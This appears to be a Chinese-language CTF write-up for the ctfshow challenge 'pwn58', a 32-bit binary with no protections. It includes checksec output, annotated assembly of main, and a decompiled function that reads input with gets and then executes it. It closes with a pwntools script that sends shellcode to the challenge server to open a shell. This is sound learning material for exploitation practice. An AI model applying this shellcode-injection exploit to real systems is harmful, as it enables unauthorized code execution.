```
tasike@tasike-VM:~/Desktop$ chmod 777 pwn58
```

```
tasike@tasike-VM:~/Desktop$ file pwn58
pwn58: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=08e1f028d9d071183aaaab2db16603c8dd3d6807, not stripped
```

```
tasike@tasike-VM:~/Desktop$ checksec pwn58
[*] '/home/tasike/Desktop/pwn58'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX unknown - GNU_STACK missing
    PIE:      No PIE (0x8048000)
    Stack:    Executable
    RWX:      Has RWX segments
```

`32bit`，啥保护都没开，而且具有可读可写可执行段

`ida`查看，`main`函数不能反编译，直接看汇编代码

```assembly
; Attributes: bp-based frame fuzzy-sp

; int __cdecl main(int argc, const char **argv, const char **envp)
public main
main proc near

s= byte ptr -0A0h
var_C= dword ptr -0Ch
argc= dword ptr  8
argv= dword ptr  0Ch
envp= dword ptr  10h

; __unwind {
lea     ecx, [esp+4]    ;把esp+4的地址加载到ecx寄存器中(假如esp=0x1000,则ecx=0x1004)
and     esp, 0FFFFFFF0h    ;按位与操作，使得esp的最后一位十六进制位为0，不管怎么样esp只能往上或不动
push    dword ptr [ecx-4]   ;把ecx-4处的dword大小的数据压入栈中
push    ebp   ;把ebp的值压入栈中
mov     ebp, esp   ;让ebp指向栈顶
push    ebx   ;把ebx的值压入栈中
push    ecx   ;把ecx的值压入栈中
sub     esp, 0A0h   ;esp向上移动0xA0
call    __x86_get_pc_thunk_bx   ;调用函数(这函数没什么用，就是mov ebx, [esp+0])
add     ebx, (offset _GLOBAL_OFFSET_TABLE_ - $)   ;将全局偏移表（Global Offset Table）的地址减去当前程序的基址，然后将结果添加到寄存器ebx中。这个指令通常用于获取函数在内存中的地址。
mov     eax, ds:(stdout_ptr - 804A000h)[ebx]   ;取内存地址为stdout_ptr - 804A000h + ebx的数据，并将其移动到eax寄存器中
mov     eax, [eax]
push    0               ; n
push    2               ; modes
push    0               ; buf
push    eax             ; stream
call    _setvbuf
add     esp, 10h
call    _getegid
mov     [ebp+var_C], eax
sub     esp, 4
push    [ebp+var_C]
push    [ebp+var_C]
push    [ebp+var_C]
call    _setresgid
add     esp, 10h
call    logo
sub     esp, 0Ch
lea     eax, (aJustVeryEasyRe - 804A000h)[ebx] ; "Just very easy ret2shellcode&&32bit"
push    eax             ; s
call    _puts
add     esp, 10h
sub     esp, 0Ch
lea     eax, (aAttachIt - 804A000h)[ebx] ; "Attach it!"
push    eax             ; s
call    _puts
add     esp, 10h
sub     esp, 0Ch
lea     eax, [ebp+s]
push    eax             ; s
call    ctfshow
add     esp, 10h
lea     eax, [ebp+s]
call    eax
mov     eax, 0
lea     esp, [ebp-8]
pop     ecx
pop     ebx
pop     ebp
lea     esp, [ecx-4]
retn
; } // starts at 804864C
main endp
```

跟进`ctfshow`，发现这个是可以反编译的

```c
int __cdecl ctfshow(char *s)
{
  gets(s);
  return puts(s);
}
```







```python
from pwn import *
context(os = 'Linux', arch = 'i386', log_level = 'debug')
p = remote('pwn.challenge.ctf.show', 28178)
shellcode = asm(shellcraft.sh())
p.sendline(shellcode)
p.interactive()
```







